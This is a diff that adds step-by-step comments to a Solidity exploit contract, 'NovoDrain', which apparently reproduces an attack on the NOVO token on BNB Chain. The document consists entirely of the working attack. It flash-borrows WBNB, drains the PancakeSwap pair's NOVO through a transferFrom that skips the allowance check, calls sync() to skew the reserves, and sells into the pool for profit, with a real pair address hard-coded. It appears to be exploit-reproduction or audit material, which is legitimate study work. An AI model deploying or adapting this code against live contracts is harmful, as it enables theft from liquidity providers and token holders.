@@ -9,11 +9,16 @@ pragma solidity ^0.8.10;
 // deploy it and record run(). Logic and constants are copied verbatim from
 // test/Novo_exp.sol::ContractTest.
 //
+// VULNERABILITY (see sources/NOVO_a0787D/NOVO.sol:2939):
 // Root cause: NOVO's transferFrom has its allowance check commented out, so
 // anyone can move ANY holder's NOVO (including the AMM pair's) with no approval.
 // A follow-up pair.sync() then forces the pair to accept the crippled balance as
 // its new reserve, skewing the price ~100x, and the attacker dumps their own
 // NOVO into the skewed pool for a large WBNB profit.
+//
+// Impact: Attacker extracts ~17+ WBNB profit (after fees) per run with only 10 WBNB seed capital.
+// The LP pair loses the economic value represented by its drained NOVO reserve (sent to the NOVO token contract).
+// Any holder of NOVO (or liquidity provider) is exposed because transferFrom is universally broken.
 
 interface IERC20 {
     function balanceOf(address) external view returns (uint256);
@@ -71,6 +76,8 @@ contract NovoDrain {
     // profit), then flash-swap from the pair. The pancakeCall callback below does
     // the actual drain + sell + repay.
     function run() external payable {
+        // EXPLOIT STEP 1: Flash-swap borrow 17.2 WBNB. Callback (pancakeCall) receives the funds
+        // with the obligation to repay amount1 + fee before returning. No capital locked up front.
         // Borrow 17.2 WBNB; the callback data carries the pair + amount (unused
         // by the callback body, which uses the constants directly — kept verbatim).
         bytes memory data = abi.encode(0xEeBc161437FA948AAb99383142564160c92D2974, BORROW_WBNB);
@@ -78,6 +85,8 @@ contract NovoDrain {
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+        // EXPLOIT STEP 2: Buy NOVO with the flash-borrowed WBNB at the fair pre-attack price.
+        // This gives the attacker a NOVO balance that will later be sold at the manipulated price.
         // Approve the router to spend the borrowed WBNB and buy NOVO with it.
         address[] memory path = new address[](2);
         wbnb.approve(address(PancakeRouter), type(uint256).max);
@@ -88,14 +97,20 @@ contract NovoDrain {
         );
         require(novo.balanceOf(address(this)) != 0, "Swap Failed");
 
+        // EXPLOIT STEP 3: Drain the LP pair's NOVO balance using the vulnerable transferFrom.
         // THE BUG: transferFrom skips the allowance check, so anyone can move the
         // pair's NOVO with no approval. Drain ~99% of the pair's NOVO out of it.
+        // See VULNERABILITY comment in sources/NOVO_a0787D/NOVO.sol around L2939.
         novo.transferFrom(address(novoLP), address(novo), DRAIN_NOVO);
 
+        // EXPLOIT STEP 4: Call sync() to make the pair's reserves match the (now-drained) real balances.
         // Force the pair to accept the crippled balance as its new reserve —
         // reserve0 collapses ~100x while reserve1 (WBNB) is unchanged.
+        // This breaks the constant-product invariant for subsequent swaps.
         novoLP.sync();
 
+        // EXPLOIT STEP 5: Sell the attacker's NOVO holdings into the manipulated pool.
+        // With reserve0 extremely low, the marginal price gives the attacker a huge WBNB payout.
         // Approve the pair and sell the attacker's NOVO into the now-skewed pool.
         novo.approve(address(PancakePair), novo.balanceOf(address(this)));
         path[0] = address(novo);
@@ -105,6 +120,7 @@ contract NovoDrain {
         );
         require(wbnb.balanceOf(address(this)) > BORROW_WBNB, "Exploit Failed");
 
+        // EXPLOIT STEP 6: Repay flash-swap (principal + fee). Profit stays with attacker.
         // Repay the flash swap: principal + 0.25% fee.
         wbnb.transfer(address(PancakePair), amount1 + FEE_WBNB);
     }
